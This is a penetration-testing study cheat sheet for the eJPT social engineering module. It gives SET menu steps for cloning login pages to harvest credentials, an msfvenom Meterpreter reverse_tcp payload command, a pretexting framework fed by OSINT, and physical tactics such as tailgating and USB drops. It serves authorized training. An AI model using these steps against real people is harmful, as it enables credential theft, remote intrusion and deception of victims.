# Social Engineering & SET Toolkit Cheat Sheet

Social Engineering — a distinct module in eJPT — covers attacks that target the human element. This document summarizes usage of SET (the Social-Engineer Toolkit) and the fundamentals of pretexting — designed to be used alongside your `phishing-cheatsheet.md` (that file covers the *analysis* side, this one covers the *attack/simulation* side).

---

## Table of Contents

1. [Types of Social Engineering (Quick Recap)](#1-types-of-social-engineering-quick-recap)
2. [SET (Social-Engineer Toolkit) Install & Launch](#2-set-social-engineer-toolkit-install--launch)
3. [Credential Harvesting with SET](#3-credential-harvesting-with-set)
4. [Creating a Payload/Listener with SET](#4-creating-a-payloadlistener-with-set)
5. [The Pretexting Framework](#5-the-pretexting-framework)
6. [OSINT → Pretext Connection](#6-osint--pretext-connection)
7. [Physical Social Engineering](#7-physical-social-engineering)
8. [Ethical & Legal Boundaries](#8-ethical--legal-boundaries)
9. [Quick Command Reference](#9-quick-command-reference)

---

## 1. Types of Social Engineering (Quick Recap)

A detailed table already exists in `phishing-cheatsheet.md` — here we summarize purely from an attack-planning angle:

| Vector | Tool/Method |
|---|---|
| Email phishing | SET, GoPhish |
| Fake login page (credential harvesting) | SET web attack module |
| Phone (vishing) | Scenario + target intel (from OSINT) |
| Physical (tailgating, USB drop) | Fake badge, "forgotten" USB drive |

---

## 2. SET (Social-Engineer Toolkit) Install & Launch

```bash
# Usually pre-installed on Kali/Parrot
sudo setoolkit

# Install from GitHub (if needed)
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip3 install -r requirements.txt
python3 setup.py install
```

Main menu:
```
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
99) Exit
```

---

## 3. Credential Harvesting with SET

Cloning a login page (Gmail, Microsoft 365, an internal company portal) to capture whatever credentials get entered.

```
setoolkit
> 1) Social-Engineering Attacks
> 2) Website Attack Vectors
> 3) Credential Harvester Attack Method
> 2) Site Cloner
> [Enter the target page URL]
> [Enter your own IP as the listener address]
```

SET automatically clones the page, spins up a web server, and displays the captured username/password in the terminal plus a `harvester_*.txt` file.

> ⚠️ **Only use this within authorized engagements and isolated test environments.** Capturing a real user's credentials without consent is illegal.

---

## 4. Creating a Payload/Listener with SET

```
setoolkit
> 1) Social-Engineering Attacks
> 4) Create a Payload and Listener
> [Choose a payload type, e.g. windows/meterpreter/reverse_tcp]
> [Enter LHOST/LPORT]
```

SET automates a combination of Metasploit's `msfvenom` + `multi/handler` behind the scenes — you then wrap the generated payload for delivery via an email attachment or USB scenario.

---

## 5. The Pretexting Framework

A good pretext (scenario) answers these questions:

| Question | Example |
|---|---|
| **Who are you?** | "IT Help Desk", "New hire", "Vendor company" |
| **Why are you reaching out?** | "Password reset process", "Invoice approval", "Urgent security update" |
| **Why now / why urgent?** | "Your account will be locked within 24 hours" |
| **What do you want?** | A click, credential entry, opening a file, physical access |
| **How is trust established?** | Real name/department info (from OSINT), a familiar-looking brand |

---

## 6. OSINT → Pretext Connection

Data gathered in `osint-cheatsheet.md` gets used directly here:

1. **From LinkedIn** — the target's manager's name, department, a recent project they joined → "With approval from your manager X..." scenario.
2. **From email format guessing** — a corporate-looking sender address that resembles a real employee.
3. **From job postings** — the software/service the target uses (e.g. "Okta SSO") → clone that service's fake login page.
4. **From company news** — a current event (a merger, a new office) → a timely, believable pretext.

---

## 7. Physical Social Engineering

| Technique | Description |
|---|---|
| **Tailgating** | Following an authorized person into a secure area without badging in yourself |
| **USB Drop** | Leaving a "forgotten" USB drive in a parking lot/lobby, hoping curiosity gets it plugged in |
| **Pretexting (in person)** | Requesting physical access with a fake ID/uniform (courier, technician) |
| **Shoulder surfing** | Observing a screen/keyboard to catch a password or sensitive info |

---

## 8. Ethical & Legal Boundaries

- [ ] Always operate under **written authorization (RoE)** — which vectors (email, phone, physical) are in scope must be spelled out.
- [ ] **Never** use harvested credentials to actually log into real systems — reporting purposes only.
- [ ] Avoid demeaning/traumatic scenarios for target employees (e.g. threats of termination).
- [ ] For physical testing, always carry a **get-out-of-jail-free letter** (authorization document).

---

## 9. Quick Command Reference

| Need | Command |
|---|---|
| Launch SET | `sudo setoolkit` |
| Credential harvester (site clone) | Menu: `1 → 2 → 3 → 2` |
| Create payload + listener | Menu: `1 → 4` |
| Manual payload generation (outside SET) | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe` |

---

*Prepared as a reference for the eJPT social engineering module. All techniques should only be used within written authorization (scope/RoE) and isolated test environments.*
